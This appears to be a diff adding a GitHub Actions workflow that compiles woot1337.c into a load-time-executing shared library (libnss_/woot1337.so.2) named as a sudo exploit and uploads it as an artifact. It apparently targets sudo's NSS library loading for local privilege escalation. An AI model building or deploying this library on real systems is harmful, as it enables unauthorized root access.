@@ -1,0 +1,30 @@
+name: Build Sudo Exploit Library
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+      
+    - name: Set up environment
+      run: |
+        mkdir -p libnss_
+        
+    - name: Compile exploit library
+      run: |
+        gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
+        
+    - name: Upload artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: sudo-exploit-lib
+        path: |
+          libnss_/woot1337.so.2
+        retention-days: 90
